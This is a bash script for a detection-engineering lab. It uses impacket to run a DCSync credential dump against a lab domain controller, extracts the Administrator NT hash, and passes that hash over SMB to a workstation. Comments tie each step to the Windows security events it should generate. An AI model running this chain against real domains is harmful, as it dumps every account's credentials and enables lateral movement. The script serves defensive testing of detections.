#!/usr/bin/env bash
# Runs ON SPLUNK01 (doubles as the Linux attacker host) via guestcontrol.
# Credential-access techniques with impacket, so no mimikatz touches the Windows guests:
#   T1003.006  DCSync        - secretsdump over DRSUAPI replication  -> Security 4662 on DC01
#   T1550.002  Pass-the-Hash - reuse the recovered NT hash to log on -> Security 4624 (NTLM) on WS01
# The domain-admin password is passed in via DA_PW (never hard-coded). Lab-only, inside the NAT net.
set -uo pipefail
: "${DA_PW:?DA_PW must be set by the caller}"

DC=10.10.10.10
WS=10.10.10.20
DOMAIN=soclab.local
ADMIN=Administrator

# --- impacket via pipx (first run installs it) ---
if ! command -v secretsdump.py >/dev/null 2>&1; then
  export DEBIAN_FRONTEND=noninteractive
  apt-get install -y pipx >/dev/null 2>&1 || true
  pipx install impacket >/dev/null 2>&1 || python3 -m pip install --break-system-packages impacket >/dev/null 2>&1
  export PATH="$PATH:/root/.local/bin"
fi
export PATH="$PATH:/root/.local/bin"

echo "=== $(date +%H:%M:%S)  T1003.006  DCSync (secretsdump -just-dc) ==="
secretsdump.py -just-dc "${DOMAIN}/${ADMIN}:${DA_PW}@${DC}" 2>&1 \
  | tee /root/dcsync.out | grep -E ':::' | head -n 20

# Pull the domain Administrator NT hash from the dump for the PtH step.
NTHASH="$(grep -iE '^Administrator:' /root/dcsync.out | head -n1 | awk -F: '{print $4}')"
echo "Recovered Administrator NT hash: ${NTHASH:+<captured>}"

echo "=== $(date +%H:%M:%S)  T1550.002  Pass-the-Hash (SMB auth with -hashes) ==="
if [ -n "${NTHASH:-}" ]; then
  # Authenticate to WS01 over SMB using ONLY the NT hash (no password). This is the pass-the-hash:
  # it produces a 4624 Logon Type 3 / NTLM / Key Length 0 event on the target, without dropping a
  # service binary (so Defender does not interfere). We list shares to force the authentication.
  printf 'shares\nexit\n' | smbclient.py -hashes ":${NTHASH}" "${DOMAIN}/${ADMIN}@${WS}" 2>&1 | head -n 20
else
  echo "  no hash recovered - skipping PtH"
fi
echo "=== impacket techniques complete ==="
